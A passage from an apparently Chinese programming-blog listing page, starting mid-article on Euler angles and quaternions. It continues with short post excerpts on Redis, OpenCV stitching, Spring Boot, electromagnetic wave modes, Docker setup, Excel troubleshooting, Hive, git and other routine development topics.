二、欧拉角 欧拉角是表示朝向的最简单最直观方法，只需存储绕 X、Y、Z 轴旋转的角度，非常容易理解。你可以用vec3来存储一个欧拉角：
vec3 EulerAngles( RotationAroundXInRadians, RotationAroundYInRadians, RotationAroundZInRadians); 这三个旋转是依次施加的，通常的顺序是：Y-Z-X（但并非一定要按照这种顺序）。顺序不同，产生的结果也不同。
不过，面对更加复杂的情况时，欧拉角就显得力不从心了。例如：
对两个朝向进行插值比较困难。简单地对X、Y、Z角度进行插值得到的结果不太理想。实施多次旋转很复杂且不精确：必须计算出最终的旋转矩阵，然后据此推测出欧拉角。“臭名昭著”的“万向节死锁”(Gimbal Lock)问题有时会让旋转“卡死”。其他一些奇异状态还会导致模型方向翻转。（参考视频：https://www.bilibili.com/video/av35803395/）
不同的角度可产生同样的旋转（例如-180°和180°）容易出错——如上所述，一般的旋转顺序是YZX，如果用了非YZX顺序的库，就有麻烦了。某些操作很复杂：如绕指定的轴旋转N角度。 三、四元数 四元数由4个数 [x y z w] 构成（这里我们不考虑数学上的定义，只考虑图像学方面的应用），RotationAxis 为旋转轴，RotationAngle 为旋转的角度。下图的旋转用四元数可表示为：
// RotationAngle is in radians x = RotationAxis.x * sin(RotationAngle / 2) y = RotationAxis.y * sin(RotationAngle / 2) z = RotationAxis.z * sin(RotationAngle / 2) w = cos(RotationAngle / 2) 1、四元数各值的意义 四元数的形式不如欧拉角直观， x y z xyz xyz 分量大致代表了各个轴上的旋转分量，而 w = cos ⁡ ( R o t a t i o n A n g l e / 2 ) w=\cos(RotationAngle/2) w=cos(RotationAngle/2)。举个例子，假设你在调试器中看到了这样的值 [ 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/872e70bd9e199f042cdd3ebc17bdaa7d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0411c73088dbe31c8e49fed8e7035c4a/" rel="bookmark">
			Redis各个模块的作用及2种企业架构选择
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.Redis最主要的主题有哪些？ 持久化、复制（主从架构）、哨兵（高可用，主备切换）、redis cluster（海量数据+横向扩容+高可用/主备切换）
持久化：高可用的一部分，在发生redis集群灾难的情况下（比如说部分master+slave全部死掉了），就需要通过持久化快速进行数据恢复，快速实现服务可用，才能实现整个系统的高可用；复制：主从架构中用到（一个Master至少一个slave），master -&gt; slave 数据复制 ；读写分离的架构，写通过master节点，读slave节点，横向扩容slave支撑更高的读吞吐，读高并发；哨兵：主从架构实现高可用（一个Master至少一个slave），在master故障的时候，快速将slave切换成master，实现快速的灾难恢复，实现高可用性；redis cluster：多master读写，数据分布式存储，横向水平扩容，快速支撑更大的数据量+更高的读写QPS，自动进行master -&gt; slave的主备切换，实现高可用； 2.企业级 Redis 架构的选择 主从架构
如果你的数据量不大单master就可以容纳，一般来说你的缓存的总量在10G以内就可以，那么建议按照以下架构去部署redis 【redis持久化+备份方案（文件备份）+容灾方案（文件恢复）+replication（主从+读写分离）+sentinal（哨兵集群，3个节点，高可用性）】 可以支撑的数据量在10G以内，可以支撑的写QPS在几万左右，可以支撑的读QPS可以上10万以上（随需求水平扩容slave节点就可以），可用性在99.99% Cluster集群架构
如果你的数据量很大,比如某些大型电商网站的商品详情页的架构数据量是很大的 数据是海量的 我们就必须采用：redis cluster 多master分布式存储数据，水平扩容（Redis自己的算法将数据分布在不同的Master节点上） 支撑更多的数据量只要扩容master即可 读写QPS分别都达到几十万都没问题，只要扩容master即可， 【redis cluster 读写分离支持不太好 readonly才能去slave上读；一般读写都在Master上】 支撑99.99%可用性也没问题 slave -&gt; master的主备切换：可以冗余一些slave去进一步提升可用性的方案（每个master挂一个slave，但是整个集群再加个3个slave冗余一下：万一某个Slave挂了Cluster会自动将冗余的Slave挂载过去） 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fe2090e3203f40ad345e2e2376cfb05e/" rel="bookmark">
			9案例实战-全景图像拼接
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		9案例实战-全景图像拼接 ImageStiching.py
﻿from Stitcher import Stitcher import cv2 # 读取拼接图片 imageA = cv2.imread("left_01.png") imageB = cv2.imread("right_01.png") # 把图片拼接成全景图 stitcher = Stitcher() (result, vis) = stitcher.stitch([imageA, imageB], showMatches=True) # 显示所有图片 cv2.imshow("Image A", imageA) cv2.imshow("Image B", imageB) cv2.imshow("Keypoint Matches", vis) cv2.imshow("Result", result) cv2.waitKey(0) cv2.destroyAllWindows() Stitcher.py
﻿import numpy as np import cv2 class Stitcher: #拼接函数 def stitch(self, images, ratio=0.75, reprojThresh=4.0,showMatches=False): #获取输入图片 (imageB, imageA) = images #检测A、B图片的SIFT关键特征点，并计算特征描述子 (kpsA, featuresA) = self.detectAndDescribe(imageA) (kpsB, featuresB) = self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fe2090e3203f40ad345e2e2376cfb05e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7a225f5ba3fac3c6044bb4f8bfdc308d/" rel="bookmark">
			springboot 接收参数 对象中包含对象List
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前端 ajax提交 设置 contentType："application/json"
提交格式
{ "buyer_email": "1365992340@qq.com", "buyer_name": "lzs", "buyer_mobile": "123456789", "passengers": [{ "create_time": "2019-04-24 14:56:30", "passport": "b1234888", "user_id": 1, "mobile": "17888888888", "name": "李xx", "id": 1, "identity_card": "370403xxxx8888" }, { "create_time": "2019-04-24 14:56:30", "passport": "b1234222", "user_id": 1, "mobile": "17222222222", "name": "徐xx", "id": 3, "identity_card": "370403xxxx3333" }, { "create_time": "2019-04-24 14:56:30", "passport": "b1234111", "user_id": 1, "mobile": "17111111111", "name": "张xx", "id": 2, "identity_card": "370403xxxx2222" }] } controller
@ResponseBody @RequestMapping(value="/order/user/{user_id}", method=RequestMethod.POST) public StatusResult SaveOrder(@PathVariable Integer user_id, @RequestBody App_order order) { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7a225f5ba3fac3c6044bb4f8bfdc308d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8b463d9f92c45acc9be59f1b71317e58/" rel="bookmark">
			电磁学中一些基础知识3
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		s波偏振，p波偏振，TE波和TM波 设电磁波沿Z轴方向传播，这时候z方向可写为exp(ikz)，假如是二维情况，比如在x方向介电常数和磁导率不变，即E和H的各个分量对x的偏导为0，将这些条件代入Maxwell方程的旋度方程，可以得到两组独立的解，分别对应于TE和TM，这时候指的TE和TM只有三个分量。
TE波，TM波这些概念的确用得很混淆，一般书上也没有详细区分。
光学中的s波偏振，p波偏振，对应于TE波和TM波，但与波导中的TE波和TM波是不同的。
光学中的TE，TM波的电磁场分量都只有三个(一般电磁场分量有6个)，TE(Ez,Hx,Hy，Ez是独立的，其他两个可以由Ez导出)，TM(Hz,Ex,Ey，Hz是独立的，其他两个可以由Hz导出)。为什么是这样？因为介质在Z方向是不变化的话，麦克斯韦方程可以拆解成两组独立的方程，一组描述TE波，一组描述TM波。
波导中的TE波和TM波都有五个分量，TE(Hz,Hx,Hy,Ex,Ey,只有Hz是独立的),TM(Ez,Ex,Ey,Hx,Hy,只有Ez是独立的）。这方面可以参考讲波导的书。TEM波，就是既有Hz，又有Ez的波。
1、激光器出来的光不一定是偏振光，但由于偏振光比较常用，所以大多数激光器设计出光为线偏振光或圆偏振光。偏振激光的产生与激光腔内布儒斯特窗（宏观：选择偏振）或晶体的各项异性（微观：选择受激辐射）有关。
2、偏振这个概念是针对电场（人所能感受到的电磁场强度）这个物理量的，不要用到磁场上，不然就把自己弄糊涂了。电场振动方向垂直入射面的叫TE波，电场振动方向在入射面内的叫TM波。
3、电磁波在自由空间中传播时，无TE或TM的说法，所以统称为TEM波，就是电磁波的意思，和偏振无关；而在波导中，电磁波一维受限，此时会在受限方向上产生模式分布，即MAXWELL方程组可以分解为两个独立的方程组，分别为TE和TM波，和偏振有关。不同的领域对TE和TM波的叫法不同，S波对应TE波，P波对应TM波，本质都是一样的。
4、用一个偏振片即可区分TE和TM和自然光，沿偏振片表面法线旋转观察其透射光有无亮暗变化即可。若是圆偏振光，则需偏振片和对应的波片搞定
电磁场在自由空间传播，只要某个方向是均匀的（例如Z方向），就会存在一种电磁波，其六个场分量对Z方向的导数为零，这时Maxwell方程也可以拆成两组独立方程（和波导类似），这就是光学中的S波和P波，文献中也经常叫TE波和TM波。
电磁波在自由空间中传播，E，H 都与传播的方向垂直，其纵向分量为零，这样的横波成为横电磁波，简称TEM波，其解满足赫姆霍兹方程。
波导中的电磁波是满足一定边界条件的赫姆霍兹方程的解。那么根据波导管中的电磁场边界条件解出来的赫姆霍兹方程的解的形式有：
1，由于波导中的 E 和 H 不能同时为零。因此波导中不存在TEM波，或者说电场和磁场不能同时为横波；
2，在波导中常选Ez = 0的一种的模，称为TE模（横电模）；
3，另一种是Hz = 0的模，称为TM模（横磁模）；
TEM TE TM模的区别
在自由空间传播的均匀平面电磁波（空间中没有自由电荷，没有传导电流），电场和磁场都没有和波传播方向平行的分量，都和传播方向垂直。此时，电矢量E，磁矢量H和传播方向k两两垂直。只是在这种情况下，才可以说电磁波是横波。沿一定途径（比如说波导）传播的电磁波为导行电磁波。根据麦克斯韦方程，导行电磁波在传播方向上一般是有E和H分量的。光的传播形态分类：根据传播方向上有无电场分量或磁场分量，可分为如下三类，任何光都可以这三种波的合成形式表示出来。
1、TEM波：在传播方向上没有电场和磁场分量，称为横电磁波。若激光在谐振腔中的传播方向为z方向，那么激光的电场和磁场将没有ｚ方向的分量！实际的激光模式是准TEM模，即允许Ez、Hz分量的存在，但它们必须&lt;&lt;横向分量，因为较大的Ez意味着波矢方向偏离光轴较大，容易溢出腔外，所以损耗大，难于形成振荡。
2、TE波(即是物光里的s波)：在传播方向上有磁场分量但无电场分量，称为横电波。在平面光波导(封闭腔结构)中，电磁场分量有Ey, Hx, Hz，传播方向为ｚ方向。
3、TM波(即是物光里的p波)：在传播方向上有电场分量而无磁场分量，称为横磁波。在平面光波导(封闭腔结构)中，电磁场分量有Hy, Ex, Ez，传播方向为ｚ方向。 微波工程、电磁场理论等课程中有关于TEM、TE、TM模的更为详细的描述。
E,H,k一定满足右手螺旋，但它们未必是两两正交的。
TE：横电模，电场纵向分量为0时。
TH：横磁模，磁场纵向分量为0时。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b38246985cabe3be536d9232aa1cb55c/" rel="bookmark">
			嵌入式linux开发环境搭建（Docker版，基于iTop 4412开发板）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		嵌入式linux开发环境搭建（Docker版，基于iTop 4412开发板） 文章目录 嵌入式linux开发环境搭建（Docker版，基于iTop 4412开发板）-1. 前言0. 环境1. 需求分析2. 基本服务搭建2.1 获取镜像2.2 创建volume2.3 创建并打开容器2.4 软件源更新2.5 vim安装2.6 net-tools安装2.7 ssh-server搭建2.8 nfs-server搭建2.9 创建服务开启脚本 3. 嵌入式编译环境搭建（基于iTop 4412）3.1 Filezilla拷贝文件3.1 交叉编译工具链3.2 uboot编译3.3 Linux Kernel编译 4. 常用docker操作4.1 启动docker容器4.2 进入docker容器4.3 退出docker容器4.4 停止docker容器4.5 重启docker容器 -1. 前言 为啥要用docker？
据说docker挺火，尝试一下“新”技术（好多年了…）相对于VMware虚拟机，docker容器占用空间少，启动/关闭速度特别快，一秒搞定。闲的… docker的安装步骤就不介绍了，可以去官网查查。
0. 环境 宿主机：win10专业版，64位宿主机IP地址：192.168.100.186docker：19.03.8docker image：ubuntu 18.04 1. 需求分析 基于ubuntussh支持，端口22（默认）nfs支持，端口2049（默认），9999（9999端口需要配置进行强行指定）vimnet-tools交叉编译工具链、源码 2. 基本服务搭建 2.1 获取镜像 docker pull ubuntu:18.04 2.2 创建volume docker volume create dataVolume 2.3 创建并打开容器 //创建容器 docker run -itd --name u1804 --privileged=true -p 9022:22 -p 9049:2049 -p 9999:9999 -v dataVolume:/work ubuntu:18.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b38246985cabe3be536d9232aa1cb55c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a8cf7ae14f1536b875b5e1e5cb9123e5/" rel="bookmark">
			Win 7中excel 2016未响应
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		方法一、 1、打开Excel 2013程序,单击菜单栏中的“文件”
2、在弹出的菜单中，单击“选项”，如下图：
3、在弹出的菜单中单击“高级”，如下图：
4、在选项框中找到“禁用图形硬件加速”，单击在这个选项前面的方框。如下图：
方法二、 1、点击win + R，如下图，输入msconfig,看到确定
2、点击鼠标左键确定，如下图，看到常规，看到服务
3、点击鼠标左键服务，如下图，看到Microsoft Service(看到已停止服务）
4、选择Microsoft Service，如下图，选择禁用
方法三、excel 2016表格打不开未响应该怎么办 excel打开无bai响应,出现这个问题一般是由du于office系统注册项引起的。具体操作zhi步骤如下:
1、打开“我的电脑”，找到“工具dao”—“文件夹选项”；
2、在文件类型中 找到后缀名为doc，找到“高级”—“打开”—“编辑”；
3、取消“使用DDE”，并在应用程序后面的“/n”后加上“%1”即可。
方法四、 1、造成这种故障现象的可能性较多，可以先尝试用safe模式进入，确认是否出现问题，排除excel本身的故障可能性，进入safe模式的方式如下，在窗口按键边空白处输入regedit进入注册表编辑器。
2、进入注册表后建议先进行备份再作后续的操作。选择&lt;文件&gt;–&lt;导出&gt;完成备份。依次选择&lt;计算机&gt;–Hkey_Class_Root子目录，进入后再找到Excel.Sheet.12子项，双击打开子项。
3、在Excel.Sheet.12子项下，依次找到––子项进入，参考下图，右侧就是双击工作簿默认调用的打开命令，我们需要修改默认打开的键值
4、双击打开右侧的默认键值，先将目前的键值找个文本编辑器保存下，现在是以DDe状态打开，修改为"D:\Program Files\Microsoft Office\Office16\EXCEL.EXE" /Safe
5、保存键值后退出注册表编辑器，重启电脑。再次尝试双击开打工作簿，如果能够正常打开，那定位为excel的配置问题，继续看第7步，否则就是环境的问题，跳至第11步查看。
6、打开excel后，在选择缺省模板界面，选择右侧的&lt;打开其它工作簿&gt;选项，在随后出现的界面中选择右侧树状菜单中的最后一项&lt;选项&gt;，参考下图所示，双击打开选项。
7、关键的配置在选择中的三处，参考下图，为&lt;高级&gt;、&lt;加载项&gt;、和&lt;信任中心&gt;三处，点入加载项后进入，在下文管理加载中，选择com加载项，然后选择右侧的转到，在随后的菜单中去掉所有加载项的选项。
8、加载项去除后如无效，将加载项恢复原状，选择信任中心，选择宏设置，如下图所示，先将所有的宏禁用，再回到第六步进行测试，如不成功，则在activeX设置中，选择禁用所有的控件
9、上述方法都无效，进入到&lt;高级&gt;菜单，下拉菜单，参考下图，去掉&lt;忽略使用动态交换(DDE)的其它应用程序&gt;前的复选框，或者用注册表编辑器去掉最后的DDE选项。上述配置基本能解决excel本身配置的问题。
方法五、Excel卡死无响应问题 ：共享打印机问题 win 7删除共享打印机
1、在我的电脑图标上右键管理(G)，调出计算机管理。
2、在左侧的导航栏中依次选择并打开计算机管理(本地)&gt;服务和应用程序&gt;服务；然后在右侧的窗口中找到Print Spooler的打印服务。在Print Spooler上右键
3、打开Print Spooler的属性窗口后，在启动类型中设置成手动或者禁用，然后选择应用，再选择停止，然后再确定。即时就生效了。如下图所示的这样。
方法五、 win + r 中输入 Excel /safe，然后单击“确定”
如果问题得到解决，请单击“文件”&gt;“选项”&gt;“加载项”。
选择“COM 加载项”，然后单击“转到”。
清除列表中的所有复选框，然后单击“确定”。
关闭然后重新启动 Excel。
参考链接 ：
解决​excel里一复制就卡死的经验分享 ：http://blog.sina.com.cn/s/blog_53734b7c0102wgj2.html
win7如何取消打印机共享？ : https://zhidao.baidu.com/question/483002373.html
教你win7如何共享打印机 https://baijiahao.baidu.com/s?id=1653498379800428551&amp;wfr=spider&amp;for=pc
https://www.xuexila.com/excel/2003/1475031.html
https://www.xuexila.com/excel/biaoge/1426112_2.html
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a8cf7ae14f1536b875b5e1e5cb9123e5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3dce23a994c8136bbf755b24ac5f6f64/" rel="bookmark">
			Hive中的四种排序方式（order by,sort by,distribute by,cluster by）使用与区别详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在平时的Hive数仓开发工作中经常会用到排序，而Hive中支持的排序方式有四种，这里结合具体的案例详细介绍一下他们的使用与区别：
order bysort bydistribute bycluster by 准备工作：
新建一个测试用表employInfo： create table employInfo(deptID int,employID int,employName string,employSalary double) row format delimited fields terminated by ','; 向测试用表中导入测试数据： load data local inpath '/home/hadoop/datas/employInfo.txt' into table employInfo; 以下为测试用的数据：
[hadoop@weekend110 datas]$ cat employInfo.txt deptID,employID,employName,employSalary 1,1001,Jack01,5000 1,1002,Jack02,5001 1,1003,Jack03,5002 1,1004,Jack04,5003 1,1005,Jack05,5004 1,1006,Jack06,5005 1,1007,Jack07,5006 1,1008,Jack08,5007 1,1009,Jack09,5008 1,1010,Jack10,5009 1,1011,Jack11,5010 1,1012,Jack12,5011 2,1013,Maria01,7500 2,1014,Maria02,7501 2,1015,Maria03,7502 2,1016,Maria04,7503 2,1017,Maria05,7504 2,1018,Maria06,7505 2,1019,Maria07,7506 2,1020,Maria08,7507 2,1021,Maria09,7508 3,1022,Lucy01,8540 3,1023,Lucy02,8541 3,1024,Lucy03,8542 3,1025,Lucy04,8543 3,1026,Lucy05,8544 3,1027,Lucy06,8545 3,1028,Lucy07,8546 3,1029,Lucy08,8547 3,1030,Lucy09,8548 3,1031,Lucy10,8549 3,1032,Lucy11,8550 3,1033,Lucy12,8551 4,1034,Jimmy01,10000 4,1035,Jimmy02,10001 4,1036,Jimmy03,10002 4,1037,Jimmy04,10003 4,1038,Jimmy05,10004 4,1039,Jimmy06,10005 4,1040,Jimmy07,6300 4,1041,Jimmy08,6301 4,1042,Jimmy09,6302 4,1043,Jimmy10,6303 4,1044,Jimmy11,6304 4,1045,Jimmy12,6305 5,1046,Ace01,6306 5,1047,Ace02,9700 5,1048,Ace03,9701 5,1049,Ace04,9702 5,1050,Ace05,9703 5,1051,Ace06,9704 5,1052,Ace07,9705 下面详细介绍四种排序：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3dce23a994c8136bbf755b24ac5f6f64/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb1bb8ec68a5d4ff8c29965aefc1a3e3/" rel="bookmark">
			a2dp播放流程源码分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		之前分析了a2dp profile 的初始化的流程，这篇文章分析一下，音频流在bluedroid中的处理流程。
上层的音频接口是调用a2dp hal 里面的接口来进行命令以及数据的发送的。
关于控制通道的初始化以及建立的过程，这里就不分析了，我们主要看数据的流向和处理。我们从控制通道的最后一个命令start 开始分析流程。
我们直接看a2dp hal 中out_write的实现： static ssize_t out_write(struct audio_stream_out *stream, const void* buffer, size_t bytes) { struct a2dp_stream_out *out = (struct a2dp_stream_out *)stream; int sent; ... if (out-&gt;common.state == AUDIO_A2DP_STATE_SUSPENDED) { DEBUG("stream suspended"); pthread_mutex_unlock(&amp;out-&gt;common.lock); return -1; } /* only allow autostarting if we are in stopped or standby */ if ((out-&gt;common.state == AUDIO_A2DP_STATE_STOPPED) || (out-&gt;common.state == AUDIO_A2DP_STATE_STANDBY)) { if (start_audio_datapath(&amp;out-&gt;common) &lt; 0)//新建audio patch { /* emulate time this write represents to avoid very fast write failures during transition periods or remote suspend */ int us_delay = calc_audiotime(out-&gt;common.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fb1bb8ec68a5d4ff8c29965aefc1a3e3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/49d0437b19538f025b2224bf0f5c23a2/" rel="bookmark">
			git 日常操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		创建远程仓库 在你要创建仓库的文件目录下 右键 选择 Git Bash Here
输入命令 git init,执行成功之后 你会看见在此目录下会生成 名为“.git”的文件夹
执行命令 git status 查看文件状态
输入 命令 git add . 添加所有文件
输入命令 git commit -m ‘注释’ 提交所有操作
创建远程仓库：打开 github官网，登录账号 新建仓库
创建SSH KEY。先看一下你C盘用户目录下有没有.ssh目录，有的话看下里面有没有id_rsa和id_rsa.pub这两个文件，有就跳到下一步，没有就通过下面命令创建：
$ ssh-keygen -t rsa -C “youremail@example.com”
登录Github,找到右上角的图标，打开点进里面的Settings，再选中里面的SSH and GPG KEYS，点击右上角的New SSH key，然后Title里面随便填，再把刚才id_rsa.pub里面的内容复制到Title下面的Key内容框里面，最后点击Add SSH key，这样就完成了SSH Key的加密。具体步骤也可看下面：
使用 git remote add origin https://github.com/guyibang/TEST2.git 命令 本地仓库关联远程仓库使用 git push -u origin master 命令上传代码 参考文章:https://blog.csdn.net/liuweixiao520/article/details/78971221
删除远程仓库 打开 github 官网 —&gt; 选择 要删除的仓库 —&gt; 点击 setting —&gt; 往下滑到最下边 ----&gt; 选择 Delete this repository ，弹窗如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/49d0437b19538f025b2224bf0f5c23a2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/add74b2334e445f2940304e11d285006/" rel="bookmark">
			cuda10.1&#43;opencv4.4.0-pre 多人脸检测(GPU版本)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		**
cuda10.1+opencv4.4.0-pre 多人脸检测(GPU版本) 说明： 代码中使用的模型文件：haarcascade_frontalface_alt.xml ，可以使用opencv的github 的data/haarcascades_cuda/haarcascade_frontalface_default.xml 文件。
#include &lt;iostream&gt; #include &lt;chrono&gt; #include &lt;opencv2/opencv.hpp&gt; #include &lt;opencv2/imgproc/types_c.h&gt; #include &lt;opencv2/cudaimgproc.hpp&gt; #include &lt;opencv2/cudaobjdetect.hpp&gt; using namespace cv; int main(int argc,char *argv[]) { auto gpu_num = cuda::getCudaEnabledDeviceCount();; std::cout&lt;&lt;"gpu num:"&lt;&lt;gpu_num&lt;&lt;std::endl; auto dev_id = cuda::getDevice(); std::cout&lt;&lt;"device id:"&lt;&lt;dev_id&lt;&lt;std::endl; if (argc != 2) { std::cout &lt;&lt; argv[0] &lt;&lt; " jpgname" &lt;&lt; std::endl; return 0; } Mat image = imread(argv[1], 1); auto cc = cuda::CascadeClassifier::create("./haarcascade_frontalface_alt.xml"); if (!cc) { std::cout &lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/add74b2334e445f2940304e11d285006/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1ae299b1f53f99a6e839d08c7194113/" rel="bookmark">
			使用fork clone到本地的代码时提示“Authentication failed for....”
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用fork clone到本地的代码时提示“Authentication failed for....” 最近公司在从svn往git上转，我查了常用的git的代码管理工具最后选择了fork；全英文的对我是个考验，不过大概也就那么几个主要功能，不过在拉去代码的时候出现了一个问题一直提示我“Authentication failed for…”
我网页上
尝试登陆正常登录访问git链接，后来查了治疗这么解决的：
最后把“普通凭证带有git”上图打码的删除掉。重新导fork上登陆拉一下代码应该就成功了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3542a656cbe75879d98a81965a24480d/" rel="bookmark">
			idea 错误: 找不到或无法加载主类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用idea创建了一个Java project 设置到在运行的时候 一直提示
错误：无法加载主类
原因：java.lang.ClassNotFoundException
解决办法:
1.在IDEA右上角点击蓝色的标志
2.点击Modules–&gt;Paths–&gt;选择Use module compile output path
3.将 红色区域内的路径 换成你的实际项目路径即可 如果发现你的实际项目路径和这里的路径不一样 那8成就是这个问题了 修改了之后 完美解决 ！ 如果还没解决 那么你就要考虑一下你的环境变量是否正确了。
如果还没有解决还可以考虑以下的方法
链接：https://my.oschina.net/gaomq/blog/3111836
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3bd7ec919c9fcdd1fb43c1eb1410cb32/" rel="bookmark">
			mysql|优化原则小表驱动大表|in&amp;exists|单双路排序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.观察 至少跑一天,查看生产的慢sql情况
2.开启慢查询日志, 设置阈值,将符合条件的慢sql抓取出来
3.explain +慢sql分析
4.show profile
5.运维经理或者DBA进行sql数据库参数调优
===总结
1.慢查询的开启并捕获
2.expain+慢查询分析
3.show profile查询
4.sql数据库服务器的参数调优
小表驱动大表
for(i=5;...){ for (i=1000){ } } for(i=1000;...){ for (i=5){ } } 第一种,比较好,因为数据库需要建立链接与释放,第一种建立了五次链接,第二种建立了1000次链接
in的语法规则是先将in后的子查询查出来,根据in数据集里面的一条数据,去搜寻主表的id,查看是否与in里面的数据集相等,相等的保留,
exists是先将主表你的数据选出来,然后提取出主表的第一条数据,去次表里查看有没有 满足条件的,在满足条件的保留,所以建立连接的次数是主表的次数
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/25b6cc668c7222b6779d971c0356190b/" rel="bookmark">
			vue &#43; elementui &#43; webpack4打包上线 history 和 hash的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需要在本地打开 在路由文件夹里面 路由模式为 hash 值， 然后 在webpack.config.js 里面的publicPath 配置为 ‘./’
关于webpack publicPath 里面的 ‘/’ 和 './'的区别
‘/’ 代表的是 绝对路径， 主要是应用于 webpack里面所有loader或者是plugin 需要路径会加上的一个 绝对路径
‘./’ 代表的是相对路径， 对于所有的打包的静态资源都是相对于 dist路径的。
如果 hash 用上面的配置方法在本地点击index.html 是可以打开的。配置如下：
结果如下：刷新页面不会丢失
不需要在本地打开，并且想使用路由模式为history 官方提到了，如果使用history模式，必须要后端来配合一起。 vue路由模式官网
所以我也使用nginx来配置。配置文件如下：
结果如下： 刷新页面不会报404
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02350c6808f3bf61762b9b41f5918fd1/" rel="bookmark">
			UE4 根据文件夹路径生成文件夹下的所有静态网格体(蓝图)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		根据文件夹路径生成文件夹下的所有静态网格体 获取文件夹下的所有文件。
红色的框标出来的是文件夹路径，获取文件夹下的所有文件，循环转换为StaticMesh如果成功表明获取到的文件为静态网格文件。
创建一个类，类里的模型有一个 StaticMeshComponent 组件，再声明一个StaticMesh类型的变量，设置为在生成时可见。
初始化类时把模型赋值给组件。
获取文件夹下的所有静态网格模型，并赋值给新生成的类。
注 ： FindOrLoadAssetsByPath函数的声明
.h
.cpp
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/da06200412769947d974887989614814/" rel="bookmark">
			本地单独使用maven下载pom.xml的依赖
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		maven maven的下载安装教程可以参考：
https://blog.csdn.net/qq_43656233/article/details/106935439?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522159457629219725250148006%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=159457629219725250148006&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2blogfirst_rank_v2~rank_blog_default-1-106935439.pc_v2_rank_blog_default&amp;utm_term=maven
下载 随便创建一个文件夹，里边包括pom.xml 一个txt 和一个 lib文件夹
首先和Springboot一样设置一个pom.xml文件，里边填好所有的依赖包的信息，在最后的地方加上：
这样文件就会下载到lib文件夹里
&lt;plugin&gt; &lt;artifactId&gt;maven-dependency-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;excludeTransitive&gt;false&lt;/excludeTransitive&gt; &lt;stripVersion&gt;true&lt;/stripVersion&gt; &lt;outputDirectory&gt;./lib&lt;/outputDirectory&gt; &lt;/configuration&gt; &lt;/plugin&gt; 打开txt文件，里边写上：mvn dependency:copy-dependencies，然后关闭，把文件的后缀改为bat。
运行bat文件，所有依赖下载成功
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8fbdae804f363c0c6a1014064234572/" rel="bookmark">
			自编记单词小程序项目（自定义词库，多功能）C/C&#43;&#43;语言实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一款方便实用又简洁的记单词小程序，自定义单词库，多功能协助记忆！！！ github地址：https://github.com/Knock-man/Memorizing-words-program
